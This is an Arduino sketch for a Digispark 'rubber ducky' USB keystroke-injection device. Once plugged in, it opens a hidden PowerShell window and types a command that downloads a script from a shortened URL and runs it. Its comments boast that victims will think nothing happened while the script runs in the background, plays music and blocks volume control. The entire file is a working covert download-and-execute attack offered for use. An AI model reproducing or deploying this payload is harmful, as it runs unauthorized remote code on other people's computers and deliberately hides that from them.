#include "DigiKeyboard.h"

void setup() { // The code goes inside setup since it should only run once.

  // Init LED and wait for ducky to init
  pinMode(1, OUTPUT);
  DigiKeyboard.delay(750);

  // Open a hidden Powershell window
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(150);
  DigiKeyboard.println("powershell -W h"); // PowerShell.exe -WindowStyle Hidden
  DigiKeyboard.delay(300);

  // Download and run the rest of the script
  DigiKeyboard.println("iex(iwr -useb bit.do/eSLgf)");

  // All done, turn on LED so you know you can unplug it
  DigiKeyboard.delay(100);
  digitalWrite(1, HIGH);

  // Since everything is done inside the PS script, the ducky can be unplugged now and the script will keep running. 
  // People will only see a flashing PowerShell window, so they'll think nothing happened to their machine. However,
  // the script is actually running in the background and runs itself after 30 seconds. 
  
  // Furthermore, since there's no tray icon, people will have to either turn off their computer to stop the music,
  // the script prevents you from turning down the volume (!), or kill the PowerShell script through Task Manager.
}

void loop() { } // Nothing
